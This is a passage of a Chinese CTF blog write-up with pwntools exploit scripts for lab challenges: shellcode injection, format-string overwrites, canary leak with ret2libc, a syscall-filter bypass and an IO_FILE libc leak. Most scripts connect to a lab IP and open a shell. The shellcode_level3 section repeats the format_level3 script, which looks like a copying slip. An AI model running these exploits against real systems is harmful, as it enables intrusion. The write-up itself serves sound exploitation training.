class="hljs-number">0x0000000000401182</span><br>rdx = <span class="hljs-number">0x0000000000401183</span><br><br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(rdi) + p64(binsh) + p64(rax) + p64(<span class="hljs-number">59</span>) + p64(rdx) + p64(<span class="hljs-number">0</span>) + p64(rsi_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(sys)<br><span class="hljs-comment">#io.sendline(b'/bin/sh\x00' + b'a'*0x8*4 +  p64(rax) + p64(59) + p64(rdi) + p64(goal) + p64(rsi) + p64(0) + p64(rdx_rbx) + p64(0) +p64(0) + p64(sys) )</span><br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0xe-shellcode-level2"><a href="#0xe-shellcode-level2" class="headerlink" title="0xe shellcode_level2"></a>0xe shellcode_level2</h1><p>exp 只需要注入shellcode的时候将第一个字节改为0就行了。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">20297</span>)<br><span class="hljs-comment">#p = process('./shellcode_level0')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>shellcode = asm(shellcraft.sh())<br><br>p.send(p8(<span class="hljs-number">0</span>) + shellcode)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h1 id="0xf-uninitialized-key-plus"><a href="#0xf-uninitialized-key-plus" class="headerlink" title="0xf uninitialized_key_plus"></a>0xf uninitialized_key_plus</h1><p>exp 和上一个差不多，只不过key在name的范围，注意小端序就可以</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">22740</span>)<br><span class="hljs-comment">#p = process('./uninitialized_key_plus')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">8</span>+<span class="hljs-number">8</span>+<span class="hljs-number">4</span>) + <span class="hljs-string">b'\x52\xbf\x01'</span><br>p.sendlineafter(<span class="hljs-string">b'Please input your name:\n'</span>,payload)<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendafter(<span class="hljs-string">b'Please input your key:\n'</span>,<span class="hljs-string">b''</span>)<br><br>p.interactive()<br><br><span class="hljs-comment">#0x7fffffffde14</span><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x10-format-level1"><a href="#0x10-format-level1" class="headerlink" title="0x10 format_level1"></a>0x10 format_level1</h1><p>exp 通过格式化字符串漏洞任意写将dragon.HP覆写为0即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>target = <span class="hljs-number">0x804c00c</span><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">23555</span>)<br><span class="hljs-comment">#p = process('./format_level1')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b'3'</span>)<br>payload = <span class="hljs-string">b'%9$naaaa'</span> + p32(target)<br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b'1'</span>)<br>p.recv()<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x11-little-canary"><a href="#0x11-little-canary" class="headerlink" title="0x11 little_canary"></a>0x11 little_canary</h1><p>exp 典型的canary+ret2libc3，先通过第一个read覆盖canary的最后一个字节连带打印出canary，然后再进行ret2libc3操作</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">28773</span>)<br><span class="hljs-comment">#p = process('./pwn')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./pwn'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br><br>vuln = <span class="hljs-number">0x40121B</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000401343</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br><span class="hljs-comment">#main = 0x40122B</span><br><br><br><span class="hljs-comment">#canary</span><br>payload0 = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">8</span>) + <span class="hljs-string">b'b'</span><br>p.recvuntil(<span class="hljs-string">b"What's your name?\n"</span>)<br>p.send(payload0)<br>p.recvuntil(<span class="hljs-string">b'b'</span>)<br>canary=u64(p.recv(<span class="hljs-number">7</span>)+<span class="hljs-string">b'\x00'</span>)*<span class="hljs-number">0x100</span><br>log.info(<span class="hljs-string">'canary -&gt; 0x%x'</span>,canary)<br>log.info(<span class="hljs-string">"puts_plt -&gt; 0x%x"</span>, puts_plt)<br>log.info(<span class="hljs-string">"puts_got -&gt; 0x%x"</span>, puts_got)<br><br><span class="hljs-comment">#ret2libc</span><br>payload1 = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">8</span>) + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt-<span class="hljs-number">4</span>) + p64(vuln)<br>p.recvuntil(<span class="hljs-string">b"I put a canary on my stack!\n"</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload1)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>, puts_addr)<br><br>libc = LibcSearcher(<span class="hljs-string">'puts'</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">'puts'</span>)<br>log.info(<span class="hljs-string">"libc  -&gt; %x"</span>, libcbase)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">'system'</span>)<br>log.info(<span class="hljs-string">"system  -&gt; %x"</span>, system_addr)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">'str_bin_sh'</span>)<br>log.info(<span class="hljs-string">"binsh  -&gt; %x"</span>, binsh_addr)<br><br>payload2=<span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span> -<span class="hljs-number">8</span>) + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)<br><span class="hljs-comment">#p.recvuntil("What's your name?\n")</span><br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x12-shellcode-level3"><a href="#0x12-shellcode-level3" class="headerlink" title="0x12 shellcode_level3"></a>0x12 shellcode_level3</h1><p>exp 只让注入5个字节，但是程序有getshell的程序，所以直接用jmp跳转就行</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>target = <span class="hljs-number">0x8049317</span><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">2954</span>)<br><span class="hljs-comment">#p = process('./format_level3')</span><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">b"%6$p"</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>p.sendline(payload)<br>p.recvline()<br>stack = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">4</span><br>log.info(<span class="hljs-string">"func_ret -&gt; %x"</span>,func_ret)<br><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">"%{}p%6$hhn"</span>.<span class="hljs-built_in">format</span>(func_ret &amp; <span class="hljs-number">0xff</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload.encode())<br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>payload = <span class="hljs-string">"%{}p%14$hn"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x9317</span>)<br>p.sendline(payload.encode())<br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"4"</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x13-changeable-shellcode"><a href="#0x13-changeable-shellcode" class="headerlink" title="0x13 changeable_shellcode"></a>0x13 changeable_shellcode</h1><p>exp shellcode注入题，但是在filter过滤了’\x0f\x05’即syscall，那么就在shellcode里动态的生成最后的syscall就行。后面的一堆代码都是复制shellcode到mmap内存中去执行。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('10.184.235.198',64377)</span><br>p = process(<span class="hljs-string">'./shellcode'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br><span class="hljs-comment"># 第一条语句是为了在\x0f后面添加\x05形成syscall</span><br>shellcode = <span class="hljs-string">'''</span><br><span class="hljs-string">mov byte ptr[rax+33], 5</span><br><span class="hljs-string">push 0</span><br><span class="hljs-string">mov rax, 0x68732f2f6e69622f</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">push rsp</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">mov rax, 59</span><br><span class="hljs-string">'''</span><br>gdb.attach(p)<br>p.sendline(asm(shellcode)+<span class="hljs-string">b'\x0f'</span>)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x14-format-level2"><a href="#0x14-format-level2" class="headerlink" title="0x14 format_level2"></a>0x14 format_level2</h1><p>exp 这次attack里面没有调用success函数，但是该函数还是存在于程序中，那么我们可以通过格式化字符串来修改函数返回地址为success函数来获取shell。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>target = <span class="hljs-number">0x8049317</span><br><span class="hljs-comment">#p = remote('10.184.235.198',64643)</span><br>p = process(<span class="hljs-string">'./format_level2'</span>)<br><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>payload = <span class="hljs-string">b"%p"</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b'You said: \n'</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">64</span><br><span class="hljs-built_in">print</span>(func_ret)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">b"%23p%10$hhn"</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">b'a'</span>) + p32(func_ret)<br>gdb.attach(p)<br><span class="hljs-comment">#pause()</span><br>p.send(payload)<br>p.recv()<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">b"%147p%10$hhn"</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">b'a'</span>) + p32(func_ret+<span class="hljs-number">1</span>)<br><span class="hljs-comment">#.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.sendline(<span class="hljs-string">b"4"</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x15-feedback"><a href="#0x15-feedback" class="headerlink" title="0x15 feedback"></a>0x15 feedback</h1><p>exp 程序一开始就将flag写到了libc中</p>
<p>而且程序中只有一个数组越界漏洞，并且程序加了PIE。但是feedback_list上面有一个_IO_2_1_stdout的指针</p>
<p>我们可以数组越界来修改IO_FILE来泄露出libc地址，修改的值也很简单</p>
<p>将前一个值修改为0xFBAD1800，后一个值的最后一个字节修改为’\x00’即可。</p>
<p>这处指针指向了它自己，然后可以修改其末尾的一个字节指向feedback_list，再通过修改feedback_list的内容为flag地址就可以将其打印出来。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>target = <span class="hljs-number">0x8049317</span><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">2061</span>)<br><span class="hljs-comment">#p = process('./feedback')</span><br>p.recv()<br>p.sendline(<span class="hljs-string">b"-8"</span>)<br>payload = p64(<span class="hljs-number">0xFBAD1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b'\x00'</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b'\x00'</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ec980</span><br>log.info(<span class="hljs-built_in">hex</span>(libc_base))<br>flag = libc_base + <span class="hljs-number">0x1f1700</span><br><br>p.recv()<br>p.sendline(<span class="hljs-string">b"-11"</span>)<br>p.recv()<br>payload = <span class="hljs-string">b'\x68'</span><br>p.sendline(payload)<br>p.recv()<br>p.sendline(<span class="hljs-string">b"-11"</span>)<br>p.recv()<br>p.sendline(p64(flag))<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x16-format-level3"><a href="#0x16-format-level3" class="headerlink" title="0x16 format_level3"></a>0x16 format_level3</h1><p>exp 格式化字符串的参数改为全局了，那就找链表来覆写函数返回地址为success函数。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>target = <span class="hljs-number">0x8049317</span><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">2954</span>)<br><span class="hljs-comment">#p = process('./format_level3')</span><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">b"%6$p"</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>p.sendline(payload)<br>p.recvline()<br>stack = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">4</span><br>log.info(<span class="hljs-string">"func_ret -&gt; %x"</span>,func_ret)<br><br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>payload = <span class="hljs-string">"%{}p%6$hhn"</span>.<span class="hljs-built_in">format</span>(func_ret &amp; <span class="hljs-number">0xff</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload.encode())<br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"3"</span>)<br>p.recvuntil(<span class="hljs-string">b'Input what you want to talk: \n'</span>)<br>payload = <span class="hljs-string">"%{}p%14$hn"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x9317</span>)<br>p.sendline(payload.encode())<br>p.recvuntil(<span class="hljs-string">b'Your choice: \n'</span>)<br>p.sendline(<span class="hljs-string">b"4"</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/18/prctl-seccomp/">← Next prctl-seccomp-orw</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/">Tcache Attack中的Tcache dup（基础） Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-test-nc"><span class="toc-number">1.</span> <span class="toc-text">0x1 test_nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-baby-calculator"><span class="toc-number">2.</span> <span class="toc-text">0x2 baby_calculator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-fd"><span class="toc-number">3.</span> <span class="toc-text">0x3 fd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-int-overflow"><span class="toc-number">4.</span> <span class="toc-text">0x4 int_overflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x5-ret2text-32"><span class="toc-number">5.</span> <span class="toc-text">0x5 ret2text_32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x6-ret2text-64"><span class="toc-number">6.</span> <span class="toc-text">0x6 ret2text_64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x7-shellcode-level0"><span class="toc-number">7.</span> <span class="toc-text">0x7 shellcode_level0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x8-shellcode-level1"><span class="toc-number">8.</span> <span class="toc-text">0x8 shellcode_level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x9-uninitialized-key"><span class="toc-number">9.</span> <span class="toc-text">0x9 uninitialized_key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xa-format-level0"><span class="toc-number">10.</span> <span class="toc-text">0xa format_level0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xb-PIE-enabled"><span class="toc-number">11.</span> <span class="toc-text">0xb PIE_enabled</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xc-ret2libc"><span class="toc-number">12.</span> <span class="toc-text">0xc ret2libc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xd-ret2syscall"><span class="toc-number">13.</span> <span class="toc-text">0xd ret2syscall</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xe-shellcode-level2"><span class="toc-number">14.</span> <span class="toc-text">0xe shellcode_level2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xf-uninitialized-key-plus"><span class="toc-number">15.</span> <span class="toc-text">0xf uninitialized_key_plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-format-level1"><span class="toc-number">16.</span> <span class="toc-text">0x10 format_level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-little-canary"><span class="toc-number">17.</span> <span class="toc-text">0x11 little_canary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-shellcode-level3"><span class="toc-number">18.</span> <span class="toc-text">0x12 shellcode_level3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-changeable-shellcode"><span class="toc-number">19.</span> <span class="toc-text">0x13 changeable_shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x14-format-level2"><span class="toc-number">20.</span> <span class="toc-text">0x14 format_level2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x15-feedback"><span class="toc-number">21.</span> <span class="toc-text">0x15 feedback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x16-format-level3"><span class="toc-number">22.</span> <span class="toc-text">0x16 format_level3</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>